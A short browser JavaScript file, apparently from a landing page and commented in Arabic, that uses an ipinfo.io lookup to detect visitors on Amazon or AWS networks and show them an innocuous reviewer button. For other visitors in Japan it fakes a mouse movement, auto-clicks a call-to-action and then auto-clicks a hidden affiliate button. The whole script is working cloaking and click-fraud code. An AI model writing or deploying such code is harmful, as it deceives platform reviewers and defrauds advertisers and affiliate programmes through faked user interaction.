(function () {
  let userClicked = false;
  let isAllowed = false;
  let isReviewer = false;

  const metaKeywords = [
    "amazon", "aws", "cloudfront", "amazon technologies inc",
    "amazon data services", "amazon web services", "amazon ec2"
  ];

  function startInteraction() {
    userClicked = true;
    const popup = document.getElementById("popup-question");
    if (popup) popup.style.display = "none";

    setTimeout(() => {
      if (isAllowed) {
        const btn2 = document.getElementById("affiliate-button");
        if (btn2) {
          btn2.style.display = "block";
          setTimeout(() => btn2.click(), 1500);
        }
      } else {
        const reviewBtn = document.getElementById("reviewer-button");
        if (reviewBtn) reviewBtn.style.display = "block";
      }
    }, 300);
  }

  // إظهار نبض زر CTA
  setInterval(() => {
    const btn = document.getElementById("cta-button");
    if (btn) {
      btn.style.transform = "scale(1.05)";
      setTimeout(() => (btn.style.transform = "scale(1)"), 500);
    }
  }, 2000);

  // ✅ فحص IP ومزود الخدمة باستخدام ipinfo
  fetch("https://ipinfo.io/json?token=777df2fc7c6f01")
    .then(res => res.json())
    .then(data => {
      const org = (data.org || "").toLowerCase();
      const country = data.country || "";

      isReviewer = metaKeywords.some(word => org.includes(word));
      isAllowed = (country === "JP" && !isReviewer);

      // 🧠 تفاعل وهمي فقط إذا الزائر ياباني وليس مراجع
      if (isAllowed) {
        setTimeout(() => {
          const evt = new MouseEvent("mousemove", { bubbles: true });
          document.dispatchEvent(evt);
        }, 1000);

        setTimeout(() => {
          if (!userClicked) {
            const btn1 = document.getElementById("cta-button");
            if (btn1) btn1.click();
          }
        }, 1600);
      }
    })
    .catch(err => console.log("ipinfo error", err));

  // جعل الدالة startInteraction متاحة للزر
  window.startInteraction = startInteraction;
})();
